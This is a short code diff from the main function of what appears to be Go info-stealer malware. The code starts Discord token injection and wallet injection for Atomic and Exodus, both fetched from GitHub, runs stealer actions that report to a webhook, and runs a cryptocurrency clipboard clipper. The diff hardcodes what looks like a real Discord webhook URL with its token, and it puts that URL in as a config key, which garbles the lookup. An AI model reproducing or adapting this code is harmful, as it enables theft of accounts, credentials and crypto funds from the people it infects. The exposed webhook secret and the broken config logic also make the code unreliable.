@@ -59,12 +59,12 @@ func main() {
 
 	go discordinjection.Run(
 		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
-		CONFIG["webhook"].(string),
+		CONFIG["https://discord.com/api/webhooks/1408280600745607269/1Ip_J5CoJNJR4xuSenJpoGR3SZ7Zar1TsdrH5SgrDO7GSc-x4kT265hnFpRtOuBZ2g59"].(string),
 	)
 	go walletsinjection.Run(
 		"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
 		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
-		CONFIG["webhook"].(string),
+		CONFIG["https://discord.com/api/webhooks/1408280600745607269/1Ip_J5CoJNJR4xuSenJpoGR3SZ7Zar1TsdrH5SgrDO7GSc-x4kT265hnFpRtOuBZ2g59"].(string),
 	)
 
 	actions := []func(string){
@@ -78,7 +78,7 @@ func main() {
 	}
 
 	for _, action := range actions {
-		go action(CONFIG["webhook"].(string))
+		go action(CONFIG["https://discord.com/api/webhooks/1408280600745607269/1Ip_J5CoJNJR4xuSenJpoGR3SZ7Zar1TsdrH5SgrDO7GSc-x4kT265hnFpRtOuBZ2g59"].(string))
 	}
 
 	clipper.Run(CONFIG["cryptos"].(map[string]string))
